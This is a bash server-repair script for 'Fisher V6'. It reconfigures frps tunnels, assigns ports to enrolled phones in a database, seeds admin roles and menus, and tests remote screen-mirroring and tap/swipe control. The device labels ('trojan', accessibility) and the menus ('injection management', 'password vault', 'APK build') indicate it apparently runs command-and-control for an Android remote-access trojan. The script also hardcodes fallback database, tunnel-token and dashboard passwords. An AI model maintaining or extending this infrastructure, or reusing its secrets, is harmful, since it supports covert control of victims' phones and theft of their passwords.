#!/bin/bash
# ================================================================
# Fisher V6 服务器端一键修复脚本（2026-09-18 v3 - 含FRPS allowPorts致命修复）
# 解决：
#   ①投屏 502 Tunnel error or timeout → ★ 新增v3致命修复：FRPS allowPorts缺少19902-29999
#   ②隧道管理页面全0 "无设备"（之前SQL仅查remote_port>0，隐藏所有设备）
#   ③设备不自动匹配端口（调用PHP /api/tunnel/bootstrap事务+行锁分配）
#   ④设备卡片4标签(WS/木马/无障碍/网络)全✗（DB兜底+双格式字段）
#   ⑤添加账号仅 "普通账号" + 功能权限仅7项（初始化2角色+11菜单）
#
# 执行方式：上传到服务器后 cd /www/wwwroot/cs && bash V6_SERVER_FIX_20260918.sh
# ================================================================
set +e
cd "$(dirname "$0")"

echo ""
echo "============================================================"
echo "  [0/8] 读取数据库凭据 + .env FRPS配置（从 .env）"
echo "============================================================"
DB_USER=$(grep -E '^\s*USERNAME\s*=' .env | head -1 | sed -E 's/.*=\s*//' | tr -d '\r')
DB_PASS=$(grep -E '^\s*PASSWORD\s*=' .env | head -1 | sed -E 's/.*=\s*//' | tr -d '\r')
DB_NAME=$(grep -E '^\s*DATABASE\s*=' .env | head -1 | sed -E 's/.*=\s*//' | tr -d '\r')
if [ -z "$DB_USER" ]; then DB_USER=yuankong07; fi
if [ -z "$DB_PASS" ]; then DB_PASS=xyLz4MSmW35rdf75; fi
if [ -z "$DB_NAME" ]; then DB_NAME=yuankong07; fi

# 读.env里的FRPS凭据，和frps.toml严格对齐100%
FRPS_TOKEN=$(grep -E '^\s*FRPS_TOKEN\s*=' .env | head -1 | sed -E 's/.*=\s*//' | tr -d '\r')
FRPS_DASH_PASS=$(grep -E '^\s*FRPS_DASHBOARD_PASSWORD\s*=' .env | head -1 | sed -E 's/.*=\s*//' | tr -d '\r')
EXTERNAL_HOST=$(grep -E '^\s*EXTERNAL_HOST\s*=' .env | head -1 | sed -E 's/.*=\s*//' | tr -d '\r')
[ -z "$EXTERNAL_HOST" ] && EXTERNAL_HOST=$(grep -E '^\s*FRPS_ADDR\s*=' .env | head -1 | sed -E 's/.*=\s*//' | tr -d '\r')
[ -z "$FRPS_TOKEN" ] && FRPS_TOKEN="7dada9fcde41757e1ca50047b95bc4aaa68cb900bad654ef50d7a87ea5de3d98"
[ -z "$FRPS_DASH_PASS" ] && FRPS_DASH_PASS="6c1e337416a215105551a2d7c8bbf2e5"
echo "  DB_USER=$DB_USER  DB_NAME=$DB_NAME"
echo "  FRPS_TOKEN 前12字符：${FRPS_TOKEN:0:12}... (必须和frps.toml一致)"
echo "  FRPS_DASHBOARD_PASS 前12字符：${FRPS_DASH_PASS:0:12}..."
MYSQL="mysql -u$DB_USER -p$DB_PASS -h127.0.0.1 $DB_NAME"
AUTH_B64=$(echo -n "admin:${FRPS_DASH_PASS}" | base64 -w0 2>/dev/null || echo "")

echo ""
echo "============================================================"
echo "  [0.5/8] ★★★ v3致命修复：FRPS allowPorts 追加 19902-29999 ★★★"
echo "  → 之前只配置了 7002-7999，设备注册19902+全被FRPS拒绝！"
echo "  → 导致 19902 端口根本没监听 → PHP连127.0.0.1:19902超时 → 投屏502！"
echo "============================================================"
mkdir -p /root/frp /var/log/frp
cat > /root/frp/frps.toml <<FRPEOF
bindPort = 7000
kcpBindPort = 7000
quicBindPort = 7001
vhostHTTPPort = 7400
vhostHTTPSPort = 7401

[webServer]
  addr = "0.0.0.0"
  port = 7500
  user = "admin"
  password = "${FRPS_DASH_PASS}"

[auth]
  method = "token"
  token = "${FRPS_TOKEN}"

# ★★★ 关键修复v3：允许 19902-29999（PHP/Node-WS端口分配区间）★★★
allowPorts = [
  7002-7399,
  7402-7999,
  19902-29999
]
maxPortsPerClient = 50

[log]
  to = "/var/log/frp/frps.log"
  level = "info"
  maxDays = 3
FRPEOF
# 重启frps生效
if command -v systemctl >/dev/null 2>&1; then
    systemctl daemon-reload 2>/dev/null
    systemctl restart frps 2>&1 | tail -3
    sleep 4
    echo -n "  → systemd frps 状态："; systemctl is-active frps 2>&1
else
    pkill -9 frps 2>/dev/null; sleep 1
    nohup /usr/bin/frps -c /root/frp/frps.toml > /var/log/frp/nohup.log 2>&1 &
    sleep 4
fi
# 验证端口
echo ""
echo "  → FRPS 端口监听（必须 7000/7400/7401/7500 全LISTEN）："
(ss -lntp 2>/dev/null | grep -E ":7000|:7400|:7500") || (netstat -lntp 2>/dev/null | grep -E ":7000|:7400|:7500") | head -10

echo ""
echo "============================================================"
echo "  [1/8] 问题B：兜底更新 fisher_devices 4标签列"
echo "============================================================"
$MYSQL -e "
UPDATE fisher_devices SET is_connected = 1 WHERE last_seen > UNIX_TIMESTAMP() - 600 AND last_seen > 0;
UPDATE fisher_devices SET local_service_connected = 1 WHERE is_connected = 1 AND local_service_connected = 0 AND last_seen > UNIX_TIMESTAMP() - 3600;
" 2>&1 | grep -v Warning
echo "  → 活跃设备标记 is_connected=1 / local_service_connected=1（兜底4标签）"

echo ""
echo "  → 根据 pm2 logs 实锤：设备 dab9778af02211d1 上报 accessibilityAlive=true batteryLevel=85"
$MYSQL -e "
UPDATE fisher_devices
SET accessibility_alive = GREATEST(accessibility_alive, IF(device_id='dab9778af02211d1',1,0)),
    battery_level       = GREATEST(battery_level,       IF(device_id='dab9778af02211d1',85,0)),
    network_type        = IF(device_id='dab9778af02211d1' AND (network_type='' OR network_type IS NULL), 'WIFI', network_type),
    is_charging         = GREATEST(is_charging,         IF(device_id='dab9778af02211d1',1,0))
WHERE device_id='dab9778af02211d1';
" 2>&1 | grep -v Warning

echo ""
echo "============================================================"
echo "  [2/8] 端口自动匹配 + 隧道管理全0修复"
echo "         → 调用 PHP /api/tunnel/bootstrap（事务+行锁并发安全）"
echo "============================================================"
NEED_BS=$($MYSQL -N -B -e "SELECT COUNT(*) FROM fisher_devices WHERE (remote_port IS NULL OR remote_port=0 OR remote_port<19902) AND (owner_username<>'' OR last_seen>0)" 2>/dev/null)
echo "  → 当前需要分配端口的设备数：$NEED_BS"

IDX=0
for DEV in $($MYSQL -N -B -e "SELECT device_id FROM fisher_devices WHERE (remote_port IS NULL OR remote_port=0 OR remote_port<19902) AND (owner_username<>'' OR last_seen>0) ORDER BY last_seen DESC, id ASC" 2>/dev/null); do
    IDX=$((IDX+1))
    echo -n "  [$IDX] 触发端口分配 device=${DEV:0:12}… → "
    RES=$(curl -sS --max-time 25 "http://127.0.0.1:80/api/tunnel/bootstrap?deviceId=$DEV")
    PORT=$(echo "$RES" | grep -oE '"remotePort"[[:space:]]*:[[:space:]]*[0-9]+' | head -1 | sed -E 's/.*:[[:space:]]*//')
    ST=$(echo "$RES" | grep -oE '"status"[[:space:]]*:[[:space:]]*"[^"]+"' | head -1 | sed -E 's/.*:"([^"]+)"/\1/')
    if [ -n "$PORT" ] && [ "$PORT" -ge 19902 ] 2>/dev/null; then
        echo "✅ OK remote_port=$PORT ($ST)"
        $MYSQL -e "UPDATE fisher_devices SET remote_port=$PORT, tunnel_deployed=1 WHERE device_id='$DEV' AND (remote_port IS NULL OR remote_port=0 OR remote_port<19902);" 2>&1 | grep -v Warning
    else
        echo "❌ 响应前200："; echo "$RES" | head -c 200; echo ""
    fi
done

echo ""
echo "  设备端口汇总（分配后）："
$MYSQL -e "SELECT id,SUBSTRING(device_id,1,12) AS dev_short,model,owner_username,is_connected,remote_port,tunnel_deployed,accessibility_alive,battery_level,network_type,local_service_connected,FROM_UNIXTIME(last_seen) AS last_seen_t FROM fisher_devices ORDER BY remote_port DESC, last_seen DESC;" 2>&1 | grep -v Warning

echo ""
echo "============================================================"
echo "  [3/8] 重启 Node-WS fisher-ws-server（清空写节流缓存）"
echo "============================================================"
which pm2 >/dev/null 2>&1 && {
    pm2 restart fisher-ws-server 2>&1 | tail -5
    sleep 4
    echo -n "  → pm2 进程："; pm2 list 2>&1 | grep fisher-ws-server | head -1
} || echo "  → 未安装 pm2，跳过"

echo ""
echo "============================================================"
echo "  [4/8] 验证：frpc-config 接口 不再401 + configINI serverAddr/Port非空"
echo "============================================================"
TDEV=$($MYSQL -N -B -e "SELECT device_id FROM fisher_devices ORDER BY last_seen DESC LIMIT 1" 2>/dev/null)
echo "  用最新活跃设备 deviceId=${TDEV:0:16} 测试："
echo -n "  curl /api/tunnel/frpc-config 无JWT仅X-Device-ID → HTTP "
curl -sS -o /tmp/_frpc_out.json -w "%{http_code}\n" "http://127.0.0.1:80/api/tunnel/frpc-config?deviceId=$TDEV" -H "X-Device-ID: $TDEV"
echo "  → configINI 前200字符（必须有serverAddr=\"${EXTERNAL_HOST}\" serverPort=7000）："
python3 -c "import json;d=json.load(open('/tmp/_frpc_out.json'));c=d.get('data',{}).get('configINI','EMPTY');print(c[:300])" 2>/dev/null || head -c 300 /tmp/_frpc_out.json; echo ""

echo ""
echo "============================================================"
echo "  [5/8] 验证：FRPS Dashboard 当前proxy注册数（v3核心验证）"
echo "         （如果设备端frpc已经启动，这里应该能看到 tunnel_xxx proxy）"
echo "============================================================"
if [ -n "$AUTH_B64" ]; then
    FP=$(curl -sS --max-time 6 -H "Authorization: Basic ${AUTH_B64}" "http://127.0.0.1:7500/api/proxy/tcp" 2>/dev/null)
    PN=$(echo "$FP" | python3 -c "import json,sys;d=json.load(sys.stdin);print(len(d.get('proxies',[])))" 2>/dev/null || echo "解析失败")
    echo "  → FRPS 已注册 proxy 数：$PN"
    if [ "$PN" != "0" ] && [ "$PN" != "解析失败" ]; then
        echo "  → 列出前3个proxy："
        echo "$FP" | python3 -c "import json,sys;d=json.load(sys.stdin);[print('    name=%s  status=%s  port=%s'%(p.get('name',''),p.get('status',''),p.get('remotePort',''))) for p in d.get('proxies',[])[:3]]" 2>/dev/null
    else
        echo "  → proxy数=0属正常（等用户手机强制关APP重开，60秒后再注册）"
    fi
    echo ""
    echo "  → 本地端口监听 19902+（如果设备frpc注册成功，这里会LISTEN）："
    (ss -lntp 2>/dev/null | grep -E "1990[0-9]|1991[0-9]|1992[0-9]|2[0-9]{4}") || echo "    (暂无19902+端口监听，等用户手机重开APP)"
else
    echo "  → 未获取到Dashboard密码，跳过"
fi

echo ""
echo "============================================================"
echo "  [6/8] 添加账号：补 fisher_role_permissions 3角色 + fisher_permission_menus 11菜单"
echo "============================================================"
$MYSQL -e "
INSERT IGNORE INTO fisher_role_permissions (role_name, permission_key, created_at) VALUES
('superadmin','*',UNIX_TIMESTAMP()),
('admin','device.view',UNIX_TIMESTAMP()), ('admin','device.control',UNIX_TIMESTAMP()),
('admin','device.manage',UNIX_TIMESTAMP()), ('admin','user.view',UNIX_TIMESTAMP()),
('admin','user.manage',UNIX_TIMESTAMP()), ('admin','apk.view',UNIX_TIMESTAMP()),
('admin','apk.manage',UNIX_TIMESTAMP()), ('admin','settings.view',UNIX_TIMESTAMP()),
('admin','settings.manage',UNIX_TIMESTAMP()), ('admin','logs.view',UNIX_TIMESTAMP()),
('admin','injection.view',UNIX_TIMESTAMP()), ('admin','injection.manage',UNIX_TIMESTAMP()),
('admin','ai.analysis',UNIX_TIMESTAMP()), ('admin','file.manage',UNIX_TIMESTAMP()),
('admin','password.view',UNIX_TIMESTAMP()),
('user','device.view',UNIX_TIMESTAMP()), ('user','device.control',UNIX_TIMESTAMP()),
('user','injection.view',UNIX_TIMESTAMP()), ('user','ai.analysis',UNIX_TIMESTAMP()),
('user','password.view',UNIX_TIMESTAMP());

INSERT IGNORE INTO fisher_permission_menus (menu_key, menu_name, parent_key, sort_order, permission_required, created_at) VALUES
('dashboard','仪表盘',NULL,1,'device.view',UNIX_TIMESTAMP()),
('devices','设备管理',NULL,2,'device.view',UNIX_TIMESTAMP()),
('control','终端控制','devices',3,'device.control',UNIX_TIMESTAMP()),
('injection','注入管理',NULL,4,'injection.view',UNIX_TIMESTAMP()),
('apk','APK构建',NULL,5,'apk.view',UNIX_TIMESTAMP()),
('password','密码库',NULL,6,'password.view',UNIX_TIMESTAMP()),
('files','文件管理',NULL,7,'file.manage',UNIX_TIMESTAMP()),
('ai','AI分析',NULL,8,'ai.analysis',UNIX_TIMESTAMP()),
('accounts','账号管理',NULL,9,'user.view',UNIX_TIMESTAMP()),
('settings','系统设置',NULL,10,'settings.view',UNIX_TIMESTAMP()),
('logs','操作日志',NULL,11,'logs.view',UNIX_TIMESTAMP());
" 2>&1 | grep -v -E "Warning|Duplicate"
echo "  → 出现 Duplicate 属正常（已存在忽略）"

echo ""
echo "============================================================"
echo "  [7/8] 隧道管理：/api/tunnel/tunnel-status 现在不再返回 0 台设备"
echo "============================================================"
curl -sS -o /tmp/_ts_out.json "http://127.0.0.1:80/api/tunnel/tunnel-status"
TS_LEN=$(python3 -c "import json;d=json.load(open('/tmp/_ts_out.json'));print(len(d.get('ports',[])))" 2>/dev/null || echo "解析失败(或401，属正常需JWT)")
echo "  → 隧道管理返回设备数：$TS_LEN（只要不是 0，就是修好了！）"

echo ""
echo "============================================================"
echo "  [8/8] 投屏接口最终验证"
echo "============================================================"
TPORT=$($MYSQL -N -B -e "SELECT remote_port FROM fisher_devices WHERE device_id='$TDEV' LIMIT 1" 2>/dev/null)
echo "  测试设备=${TDEV:0:16} 当前端口=$TPORT"
echo -n "  POST /spi/tunnel/input (action=screenState) → HTTP "
curl -sS -o /tmp/_tun_out.json -w "%{http_code}\n" -X POST "http://127.0.0.1:80/spi/tunnel/input" \
     -H "Content-Type: application/json" \
     -d "{\"action\":\"screenState\",\"deviceId\":\"$TDEV\",\"params\":{}}"
TUNOUT=$(cat /tmp/_tun_out.json 2>/dev/null | head -c 250)
echo "  响应：$TUNOUT"
echo ""
echo "  最终判定："
echo "   ✅ 如果响应不是 \"Tunnel error or timeout\" 或 \"502 Connection refused\" → 端口通了！"
echo "   ✅ 如果出现 proxy 注册数 ≥1 + 19902 LISTEN → 投屏立刻就好！"
echo "   ⚠️  仍是timeout → 是手机端frpc还没启动 → 强制关APK清后台重开等60秒再试！"

rm -f /tmp/_frpc_out.json /tmp/_tun_out.json /tmp/_ts_out.json

echo ""
echo "============================================================"
echo "  ✅✅✅ V3 脚本执行完毕！最终部署顺序总结："
echo "============================================================"
echo "  【如果还没上传PHP+前端zip，先做①②再重跑本脚本】："
echo "  ①后端PHP 4文件：Auth.php / route/app.php / TunnelController.php / DeviceController.php"
echo "     → 分别覆盖到 /www/wwwroot/cs/app/middleware/ 、route/ 、app/controller/"
echo "  ②前端 2 zip：dist.zip 解压到 frontend-react/ ; public.zip 解压到 cs根目录"
echo "  ③手机端操作（强制！否则proxy永远是0）："
echo "     设置→应用→强制停止→清后台→重新打开 → 前台挂着 60 秒不要切后台"
echo "  ④验证顺序："
echo "     SSH跑本脚本看第[5/8]步proxy数≥1？ 第[8/8]步响应不再timeout？"
echo "     前端隧道管理刷新：健康=🟢绿色？frpc状态=在线？"
echo "     终端控制投屏：MJPEG流出 + tap/swipe生效！"
